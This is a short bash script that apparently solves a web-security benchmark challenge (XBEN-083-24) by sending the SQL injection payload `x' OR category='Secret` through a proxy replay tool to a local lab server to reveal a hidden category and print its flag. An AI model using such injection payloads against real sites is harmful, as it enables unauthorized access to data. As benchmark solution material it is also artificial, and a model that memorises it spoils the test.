#!/usr/bin/env bash
# XBEN-083-24 — SQL injection revealing a hidden category. Proxy-mode twin. The
# category filter concatenates input; `x' OR category='Secret` returns the
# Secret category's items, one of which is the flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben083p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=GET' --set 'path=/index.php' \
  --set "query.category=x' OR category='Secret" >/dev/null
print_flag
